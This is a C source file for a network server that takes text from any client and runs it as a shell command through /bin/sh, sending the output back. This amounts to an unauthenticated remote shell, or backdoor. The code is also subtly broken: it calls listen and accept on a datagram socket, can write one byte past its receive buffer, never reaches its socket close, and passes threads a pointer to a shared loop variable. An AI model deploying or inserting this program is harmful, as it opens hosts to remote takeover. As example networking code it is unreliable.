#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/wait.h>

void *handle_client(void *arg) {
    int client_sock = *(int *)arg;
    char msgbuf[1024];
    ssize_t n = recv(client_sock, msgbuf, sizeof(msgbuf), 0);
    if (n < 0) {
        perror("Error receiving command from client");
        return NULL;
    }
    msgbuf[n] = '\0';
    pid_t pid = fork();
    if (pid < 0) {
        perror("Error forking child process");
        return NULL;
    } else if (pid == 0) { // child process
        dup2(client_sock, STDOUT_FILENO); // redirect output to client socket
        char *args[] = {"/bin/sh", "-c", msgbuf, NULL};
        execvp(args[0], args);
        perror("Error executing command in child process");
        exit(EXIT_FAILURE);
    } else { // parent process
        waitpid(pid, NULL, 0); // wait for child process to finish
        pthread_exit(NULL);
        close(client_sock); // close client socket

        return NULL;
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    int port = atoi(argv[1]);
    int server_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (server_sock < 0) {
        perror("Error creating server socket");
        exit(EXIT_FAILURE);
    }
    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = INADDR_ANY;
    dest.sin_port = htons(port);
    if (bind(server_sock, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        perror("Error binding server socket");
        exit(EXIT_FAILURE);
    }
    if (listen(server_sock, 5) < 0) {
        perror("Error listening on server socket");
        exit(EXIT_FAILURE);
    }
    while (1) {
        struct sockaddr_in s_in = {0};
        socklen_t client_len = sizeof(s_in);
        int client_sock = accept(server_sock, (struct sockaddr *)&s_in, &client_len);
        if (client_sock < 0) {
            perror("Error accepting client connection");
            continue;
        }
        pthread_t thread_id;
        if (pthread_create(&thread_id, NULL, handle_client, &client_sock) != 0) {
            perror("Error creating pthread for client");
            continue;
        }
        pthread_detach(thread_id);
    }
    close(server_sock);
    return 0;
}